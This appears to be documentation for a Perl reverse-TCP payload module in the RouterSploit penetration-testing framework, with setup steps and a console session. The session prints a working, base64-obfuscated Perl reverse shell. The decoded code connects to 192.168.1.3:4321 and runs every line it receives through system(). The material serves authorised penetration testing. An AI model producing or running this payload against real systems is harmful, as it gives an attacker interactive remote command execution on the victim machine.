## Description

Module generates payload that creates interactive tcp reverse shell by using perl. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/perl/reverse_tcp`
  3. Do: `set lhost 192.168.1.3`
  3. Do: `set lport 4321`
  4. Do: `run`
  5. Module generates perl tcp reverse shell payload

## Scenarios

```
rsf > use payloads/perl/reverse_tcp
rsf (Perl Reverse TCP) > set lhost 192.168.1.3
[+] lhost => 192.168.1.3
rsf (Perl Reverse TCP) > set lport 4321
[+] lport => 4321
rsf (Perl Reverse TCP) > run
[*] Running module...
[*] Generating payload
use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjEuMzo0MzIxIik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Ow=='))
```
